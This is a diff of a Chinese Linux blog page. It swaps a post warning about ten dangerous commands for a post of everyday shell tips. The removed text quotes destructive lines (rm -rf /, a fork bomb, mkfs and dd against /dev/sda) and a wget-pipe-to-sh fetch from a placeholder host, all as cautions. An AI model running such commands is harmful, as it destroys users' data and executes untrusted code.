@@ -4,11 +4,12 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="Linux 10个危险的命令, C++ Linux PRC Go Docker">
+    <meta name="keywords" content="Linux 技巧, C++ Linux PRC Go Docker">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么时候。这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普通用户身份下，破">
+    <meta name="description" content="如果要谨慎使用 rm 命令，可以为它设置一个别名，在删除文件之前需要进行确认才能删除。有些系统管理员会默认使用这个别名，对于这种情况，你可能需要看看下一个技巧。
+$ rm -i    &amp;lt;== 请求确认你可以使用 unalias 命令以">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +17,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Linux 10个危险的命令 | 吴杭沉的博客</title>
+    <title>Linux 技巧 | 吴杭沉的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -266,13 +267,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Linux 10个危险的命令
+                        Linux 技巧
                     </div>
                 </div>
             </div>
@@ -407,7 +408,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2024-07-28
+                    2024-07-29
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -421,14 +422,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    11 分
                 </div>
                 
                 
@@ -444,17 +445,64 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么时候。<br>这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。<br>当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普通用户身份下，破坏的只是自己的一亩三分地。</p>
-<h1 id="rm-rf-命令"><a href="#rm-rf-命令" class="headerlink" title="rm -rf 命令"></a>rm -rf 命令</h1><p>rm -rf命令是删除文件夹及其内容最快的方式之一。<br>仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。<br>下列是一些rm 命令的选项：<br>    • rm　命令在Linux下通常用来删除文件。<br>    • rm -r 命令递归的删除文件夹，甚至是空的文件夹<br>    • rm -f 命令能不经过询问直接删除‘只读文件’。Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来要求删除确认，而-f则抑制了这个提示。<br>    • rm -rf / : 强制删除根目录下所有东东。<br>    • rm -rf *:　强制删除当前目录的所有文件。<br>    • rm -rf . : 强制删除当前文件夹及其子文件夹。<br>从现在起，当你要执行rm -rf命令时请留心一点。我们可以在“.bashrc”文件对‘rm‘命令创建rm -i的别名，来预防用 ‘rm‘命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用-f参数前一定考虑好你在做什么！译者本人有着血泪的教训啊。）</p>
-<h1 id="amp-命令"><a href="#amp-命令" class="headerlink" title=":(){:|:&amp;};: 命令"></a>:(){:|:&amp;};: 命令</h1><p>这就是个fork 炸弹的实例。<br>具体操作是通过定义一个名为 ‘:‘的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。</p>
-<h1 id="命令-gt-dev-sda"><a href="#命令-gt-dev-sda" class="headerlink" title="命令　&gt; /dev/sda"></a>命令　&gt; /dev/sda</h1><p>这个命令会将某个‘命令‘的输出写到块设备/dev/sda中。<br>该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。</p>
-<h1 id="mv-文件夹-dev-null"><a href="#mv-文件夹-dev-null" class="headerlink" title="mv 文件夹 /dev/null"></a>mv 文件夹 /dev/null</h1><p>这个命令会移动某个‘文件夹‘到/dev/null。<br>在Linux中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。<br>当然，要说明的是这个命令并不能阻止数据恢复软件——所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成。</p>
-<h1 id="wget-http-malicious-source-O-sh"><a href="#wget-http-malicious-source-O-sh" class="headerlink" title="wget http://malicious_source -O- | sh"></a>wget <a href="http://malicious_source" target="_blank" rel="noopener">http://malicious_source</a> -O- | sh</h1><p>该命令会从一个（也许是）恶意源下载一个脚本并执行。<br>Ｗget命令会下载这个脚本，而sh会（无条件的）执行下载下来的脚本。<br>注意: 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。</p>
-<h1 id="mkfs-ext3-dev-sda"><a href="#mkfs-ext3-dev-sda" class="headerlink" title="mkfs.ext3 /dev/sda"></a>mkfs.ext3 /dev/sda</h1><p>上列命令会格式化块设备‘sda’，在执行这个命令后你的块设备(硬盘驱动器)会被格式化，直接让你的系统达到不可恢复的阶段。<br>通常我们不会直接使用/dev/sda这样的设备，除非是作为raw设备使用。<br>一般都需要将sda分成类似sda1、sda2这样的分区后才使用。当然，无论你使用sda还是sda1，这样对块设备或分区进行mkfs都是毁灭性的，上面的数据都会被蒸发了。</p>
-<h1 id="gt-file"><a href="#gt-file" class="headerlink" title="&gt; file"></a>&gt; file</h1><p>这个命令常用来清空文件内容或记录命令输出。<br>不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。<br>你可能真正想用的是“&gt;&gt;”，即累加新的输出到文件，而不是刷新那个文件。<br>如果用上列执行时输入错误或无知的输入类似 “&gt; xt.conf”　的命令会覆盖配置文件或其他任何的系统配置文件。</p>
-<h1 id="foo-bar"><a href="#foo-bar" class="headerlink" title="^foo^bar"></a>^foo^bar</h1><p>这个命令用来编辑先前运行的命令而无需重打整个命令。<br>用foobar命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。</p>
-<h1 id="dd-if-dev-random-of-dev-sda"><a href="#dd-if-dev-random-of-dev-sda" class="headerlink" title="dd if=/dev/random of=/dev/sda"></a>dd if=/dev/random of=/dev/sda</h1><p>这个命令会向块设备sda写入随机的垃圾文件从而擦出数据，让你的系统可能陷入混乱和不可恢复的状态。<br>记得上面说过mv到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。</p>
-<h1 id="隐藏命令"><a href="#隐藏命令" class="headerlink" title="隐藏命令"></a>隐藏命令</h1><p>下面的命令其实就是上面第一个命令 (rm -rf)。<br>这里的代码是隐藏在十六进制里的,一个无知的用户可能就会被愚弄，如果在终端里运行下面命令可能会擦除你的根分区。<br>真正的危险是隐藏起来的，不会被轻易的检测到。你必须时刻留心你在做什么结果会怎样。<br>切记，千万不要编译／运行从未知来源的代码。</p>
+                <p>如果要谨慎使用 rm 命令，可以为它设置一个别名，在删除文件之前需要进行确认才能删除。有些系统管理员会默认使用这个别名，<br>对于这种情况，你可能需要看看下一个技巧。</p>
+<pre><code>$ rm -i    &lt;== 请求确认</code></pre><p>你可以使用 unalias 命令以交互方式禁用别名。它不会更改别名的配置，而仅仅是暂时禁用，直到下次登录或重新设置了这一个别名才会重新生效。$ unalias rm如果已经将 rm -i 默认设置为 rm 的别名，但你希望在删除文件之前不必进行确认，则可以将 unalias 命令放在一个启动文件（例如 ~/.bashrc）中。<br>如果你经常在只有 root 用户才能执行的命令前忘记使用 sudo，这里有两个方法可以解决。一是利用命令历史记录，可以使用 sudo !!（使用 !! 来运行最近的命令，并在前面添加 sudo）来重复执行，二是设置一些附加了所需 sudo 的命令别名。$ alias update=’sudo apt update’<br>有时命令行技巧并不仅仅是一个别名。毕竟，别名能帮你做的只有替换命令以及增加一些命令参数，节省了输入的时间。但如果需要比别名更复杂功能，可以通过编写脚本、向 .bashrc 或其他启动文件添加函数来实现。例如，下面这个函数会在创建一个目录后进入到这个目录下。在设置完毕后，执行 source .bashrc，就可以使用 md temp 这样的命令来创建目录立即进入这个目录下。md () { mkdir -p “$@” &amp;&amp; cd “$1”; }<br>这里有很多快捷键可以帮我们修正自己的命令。接下来使用光标二字代替光标的位置。<br>删除从开头到光标处的命令文本<br>ctrl + u，例如：$ cd /proc/tty;ls -al光标如果此时使用ctrl+u快捷键，那么该条命令都会被清除，而不需要长按backspace键。<br>删除从光标到结尾处的命令文本<br>ctrl+k，例如：$ cd /proc/tty光标;ls -al如果此时使用ctrl + k快捷键，那么从光标开始处到结尾的命令文本将会被删除。<br>还有其他的操作，不再举例，例如：<br>ctrl + a:光标移动到命令开头<br>ctrl + e：光标移动到命令结尾<br>alt  f:光标向前移动一个单词<br>alt  b：光标向前移动一个单词<br>ctrl w：删除一个词（以空格隔开的字符串）<br>我们都知道history记录了执行的历史命令，而使用!＋历史命令前的数字，可快速执行历史命令。</p>
+<h1 id="部分历史命令查看"><a href="#部分历史命令查看" class="headerlink" title="部分历史命令查看"></a>部分历史命令查看</h1><p>history会显示大量的历史命令，而fs -l只会显示部分。<br>$ tail -f filename.logtail -f 加文件名，可以实时显示日志文件内容。当然，使用less命令查看文件内容，并且使用shift+f键，也可达到类似的效果。<br>怎么知道当前磁盘是否满了呢？</p>
+<pre><code>$ df -h
+/dev/sda14      4.6G   10M  4.4G   1% /tmp
+/dev/sda11      454M  366M   61M  86% /boot
+/dev/sda15       55G   18G   35G  35% /home
+/dev/sda1       256M   31M  226M  12% /boot/efi
+tmpfs           786M   64K  786M   1% /run/user/1000</code></pre><p>使用df命令可以快速查看各挂载路径磁盘占用情况。<br>当前目录各个子目录占用空间大小<br>如果你已经知道home目录占用空间较大了，你想知道home目录下各个目录占用情况：<br>这里指定了目录深度，否则的话，它会递归统计子目录占用空间大小，可自行尝试。</p>
+<pre><code>$ free -h
+              total        used        free      shared  buff/cache   available
+Mem:           7.7G        3.5G        452M        345M        3.7G        3.5G
+Swap:          7.6G          0B        7.6G</code></pre><p>通过free的结果，很容易看到当前总共内存多少，剩余可用内存多少等等。<br>不知道你是否注意到，我们在前面几个命令中，都使用了-h参数，它的作用是使得结果以人类可读的方式呈现，所以我们看到它呈现的单位是G,M等，如果不使用-h参数，可以自己尝试一下会是什么样的结果呈现。<br>根据名称查找进程id<br>想快速直接查找进程id，可以使用：<br>pgrep hello2.22692或者：</p>
+<pre><code>$ pidof hello
+22692</code></pre><p>其中，hello是进程名称。</p>
+<h1 id="根据名称杀死进程"><a href="#根据名称杀死进程" class="headerlink" title="根据名称杀死进程"></a>根据名称杀死进程</h1><p>一般我们可以使用kill　-9 pid方式杀死一个进程，但是这样就需要先找到这个进程的进程id，实际上我们也可以直接根据名称杀死进程，例如：$ killall hello或者：<br>可以使用下面的命令查看进程已运行时间：</p>
+<pre><code>$ ps -p 24525 -o lstart,etime
+                 STARTED     ELAPSED
+Sat Mar 23 20:52:08 2019       02:45</code></pre><p>其中24525是你要查看进程的进程id。</p>
+<h1 id="快速目录切换"><a href="#快速目录切换" class="headerlink" title="快速目录切换"></a>快速目录切换</h1><p>cd -　回到上一个目录cd  回到用户家目录<br>我们知道使用分号隔开可以执行多条命令，例如：$ cd /temp/log/;rm -rf *但是如果当前目录是/目录，并且/temp/log目录不存在，<br>那么就会发生激动人心的一幕：</p>
+<pre><code>bash: cd: /temp/log: No such file or directory</code></pre><p>因为;可以执行多条命令，但是不会因为前一条命令失败，而导致后面的不会执行，因此，cd执行失败后，仍然会继续执行rm -rf <em>，<br>由于处于/目录下，结果可想而知。<br>所以你还以为这种事故是对rf -rf </em>的力量一无所知的情况下产生的吗？<br>如果解决呢？很简单，使用&amp;&amp;，例如:$ cd /temp/log/&amp;&amp;rm -rf *<br>这样就会确保前一条命令执行成功，才会执行后面一条。<br>有时候日志文件是压缩的，那么能不能偷懒一下，不解压查看呢？当然可以啦。<br>例如</p>
+<pre><code>$ zcat test.gz
+test log</code></pre><p>或者：</p>
+<pre><code>$ zless test.gz
+test log</code></pre><p>比如有一个大文件，你想快速删除，或者不想删除，但是想清空内容：</p>
+<pre><code>&gt;filename</code></pre><h1 id="将日志同时记录文件并打印到控制台"><a href="#将日志同时记录文件并打印到控制台" class="headerlink" title="将日志同时记录文件并打印到控制台"></a>将日志同时记录文件并打印到控制台</h1><p>在执行shell脚本，常常会将日志重定向，但是这样的话，控制台就没有打印了，如何使得既能记录日志文件，又能将日志输出到控制台呢？</p>
+<pre><code>$ ./test.sh |tee test.log</code></pre><h1 id="终止并恢复进程执行"><a href="#终止并恢复进程执行" class="headerlink" title="终止并恢复进程执行"></a>终止并恢复进程执行</h1><p>我们使用ctrl+z 暂停一个进程的执行，也可以使用fg恢复执行。例如我们使用<br>当我们发现文件内容可能很多时，使用ctrl+z暂停程序，而如果又想要从刚才的地方继续执行，则只需要使用fg命令即可恢复执行。或者使用bg使得进程继续在后台执行。<br>我们可能会进程写一些小程序，并且想要知道它的运行时间，实际上我们可以很好的利用time命令帮我们计算，例如：</p>
+<pre><code>$ time ./fibo 30
+the 30 result is 832040
+real    0m0.088s
+user    0m0.084s
+sys    0m0.004s</code></pre><p>它会显示系统时间，用户时间以及实际使用的总时间。</p>
+<h1 id="查看内存占用前10的进程"><a href="#查看内存占用前10的进程" class="headerlink" title="查看内存占用前10的进程"></a>查看内存占用前10的进程</h1><pre><code>$ ps -aux|sort -k4nr |head -n 10</code></pre><p>我们都知道man可以查看命令的帮助手册，但是如果我们想要某个功能却不知道使用哪个命令呢？别着急，还是可以使用man：</p>
+<pre><code>$ man -k &quot;copy files&quot;
+cp (1)               - copy files and directories
+cpio (1)             - copy files to and from archives
+git-checkout-index (1) - Copy files from the index to the working tree
+gvfs-copy (1)        - Copy files
+gvfs-move (1)        - Copy files
+install (1)          - copy files and set attributes</code></pre><p>使用-k参数，使得与copy files相关的帮助手册都显示出来了。<br>我们知道，在命令行下，复制不能再是ctrl + c了，因为它表示终止当前进程，而控制台下的复制粘贴需要使用下面的快捷键：</p>
+<pre><code>ctrl +  insertshift + insert</code></pre><p>例如，要在当前目录下查找包含test字符串的文件：</p>
+<pre><code>$ grep -rn &quot;test&quot;
+test2.txt:1:test</code></pre><p>它便可以找到该字符串在哪个文件的第几行。<br>程序运行时，终端可能输出大量的日志，你想简单查看一下，又不想记录日志文件，此时可以使用ctrl+s键，冻结屏幕，使得日志不再继续输出，而如果想要恢复，可使用ctrl+q退出冻结。<br>如果在某些系统上连基本的vi编辑器都没有，那么可以使用下面的方式进行编辑内容：</p>
+<pre><code>$ cat &gt;file.txt
+some words
+(ctrl+d)</code></pre><p>编辑完成后，ctrl+d即可保存。</p>
+<h1 id="查看elf文件头信息"><a href="#查看elf文件头信息" class="headerlink" title="查看elf文件头信息"></a>查看elf文件头信息</h1><p>例如：</p>
+<pre><code>$ readelf -h filename</code></pre><p>我们在显示结果中，可以看到运行的平台，elf文件类型，大小端情况等。<br>查看库中是否包含某个接口</p>
+<pre><code>$ nm filename |grep interface</code></pre><p>这里是从文件filename中查看是否包含interface接口，前提是该文件包含符号表。<br>如果要对一个已输入的命令进行修改，可以使用 ^a（ctrl + a）或 ^e（ctrl + e）将光标快速移动到命令的开头或命令的末尾。<br>还可以使用 ^ 字符实现对上一个命令的文本替换并重新执行命令，例如 ^before^after^ 相当于把上一个命令中的 before 替换为 after 然后重新执行一次。</p>
+<h1 id="使用远程机器的名称登录到机器上"><a href="#使用远程机器的名称登录到机器上" class="headerlink" title="使用远程机器的名称登录到机器上"></a>使用远程机器的名称登录到机器上</h1><p>如果使用命令行登录其它机器上，可以考虑添加别名。在别名中，可以填入需要登录的用户名（与本地系统上的用户名可能相同，也可能不同）以及远程机器的登录信息。例如使用 server_name =’ssh -v -l username IP-address’ 这样的别名命令：</p>
+<pre><code>$ alias butterfly=”ssh -v -l jdoe 192.168.0.11”</code></pre><p>也可以通过在 /etc/hosts 文件中添加记录或者在 DNS 服务器中加入解析记录来把 IP 地址替换成易记的机器名称。<br>执行 alias 命令可以列出机器上已有的别名。</p>
+<pre><code>$ aliasalias butterfly=&#39;ssh -v -l jdoe 192.168.0.11&#39;
+alias c=&#39;clear&#39;
+alias egrep=&#39;egrep --color=auto&#39;
+alias fgrep=&#39;fgrep --color=auto&#39;
+alias grep=&#39;grep --color=auto&#39;
+alias l=&#39;ls -CF&#39;alias la=&#39;ls -A&#39;</code></pre><p>只要将新的别名添加到 ~/.bashrc 或类似的文件中，就可以让别名在每次登录后都能立即生效。<br>^s（ctrl + s）将通过执行流量控制命令 XOFF 来停止终端输出内容，这会对 PuTTY 会话和桌面终端窗口产生影响。<br>如果误输入了这个命令，可以使用 ^q（ctrl + q）让终端重新响应。所以只需要记住 ^q 这个组合键就可以了，毕竟这种情况并不多见。<br>Linux 提供了很多让用户复用命令的方法，其核心是通过历史缓冲区收集执行过的命令。复用命令的最简单方法是输入 ! 然后接最近使用过的命令的开头字母；<br>当然也可以按键盘上的向上箭头，直到看到要复用的命令，然后按回车键。还可以先使用 history 显示命令历史，然后输入 ! 后面再接命令历史记录中需要复用的命令旁边的数字。<br>!! &lt;== 复用上一条命令!ec &lt;== 复用上一条以 “ec” 开头的命令!76 &lt;== 复用命令历史中的 76 号命令</p>
+<h1 id="查看日志文件并动态显示更新内容"><a href="#查看日志文件并动态显示更新内容" class="headerlink" title="查看日志文件并动态显示更新内容"></a>查看日志文件并动态显示更新内容</h1><p>使用形如 tail -f /var/log/syslog 的命令可以查看指定的日志文件，并动态显示文件中增加的内容，<br>需要监控向日志文件中追加内容的的事件时相当有用。这个命令会输出文件内容的末尾部分，并逐渐显示新增的内容。</p>
 
             </div>
             <hr />
@@ -489,9 +537,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《Linux 10个危险的命令》
+                    《Linux 技巧》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2024/07/28/fourteen/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2024/07/29/seventeen/" property="cc:attributionName"
                rel="cc:attributionURL">
                 吴杭沉
             </a> 采用
@@ -532,7 +580,7 @@
         repo: 'wuhangchen.github.io',
         owner: 'wuhangchen',
         admin: "wuhangchen",
-        id: '2024/07/28/fourteen/',
+        id: '2024/07/29/seventeen/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -815,30 +863,31 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2024/07/29/fifteen/">
+                <a href="/2024/07/29/seventeen/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/28.jpg" class="responsive-img" alt="Linux grep 文本查找">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Linux 技巧">
                         
-                        <span class="card-title">Linux grep 文本查找</span>
+                        <span class="card-title">Linux 技巧</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            之前介绍过很多linux下查找相关的命令，而对文件内容搜索的命令似乎还没有涉及，因此本文介绍文本搜索命令–grep。常见用法我们会经常结合管道符（|）来使用它，即在前面命令执行的结果中查找包含相关字符串的内容。例如：
-$ ps -ef|gr
+                            如果要谨慎使用 rm 命令，可以为它设置一个别名，在删除文件之前需要进行确认才能删除。有些系统管理员会默认使用这个别名，对于这种情况，你可能需要看看下一个技巧。
+$ rm -i    &lt;== 请求确认你可以使用 unalias 命令以
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2024-07-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2024-07-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -851,6 +900,7 @@ $ ps -ef|gr
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -869,24 +919,24 @@ $ ps -ef|gr
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2024/07/28/thirteen/">
+                <a href="/2024/07/29/sixteen/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Linux Shell一些快捷键">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="Linux inode资源耗尽问题">
                         
-                        <span class="card-title">Linux Shell一些快捷键</span>
+                        <span class="card-title">Linux inode资源耗尽问题</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ctrl+a:光标移到行首。ctrl+e:光标移到行尾。ctrl+b:光标左移一个字母, 向行首移动一个字符ctrl+f:光标右移,向行尾移动一个字符ctrl+c:杀死当前进程。ctrl+d:退出当前 Shell,从Shell提示中注销并关
+                            Linux系统下文件数据储存在”块”中，文件的元信息，例如文件的创建者、文件的创建日期、文件的大小等。这种储存文件元信息的区域就叫做inode，中文译名为”索引节点”。inode也占用硬盘空间，硬盘格式化的时候，操作系统自动将硬盘分成两个区
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2024-07-28
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2024-07-29
                             </span>
                         <span class="publish-author">
                             
